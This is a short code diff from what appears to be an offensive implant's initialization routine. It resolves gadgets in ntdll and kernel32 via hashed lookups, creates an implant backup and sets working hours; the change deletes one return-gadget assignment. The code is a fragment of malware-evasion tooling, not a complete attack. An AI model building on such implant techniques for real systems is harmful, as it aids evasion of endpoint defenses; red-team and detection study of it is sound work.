@@ -190,7 +190,6 @@ FUNC VOID BlackoutInit(
     CreateImplantBackup();
 #endif
 
-    Blackout().Gadgets.RetGadget        = FindNtTestAlertGadget( Instance()->Modules.Ntdll );
     Blackout().Gadgets.NtContinueGadget = (UINT_PTR)LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrInitializeThunk" ) ) + 19;
     Blackout().Gadgets.JmpGadget        = FindJmpGadget( Instance()->Modules.Kernel32, 0x23 );
     Instance()->Session.WorkingHours    = CONFIG_WRKHRS;
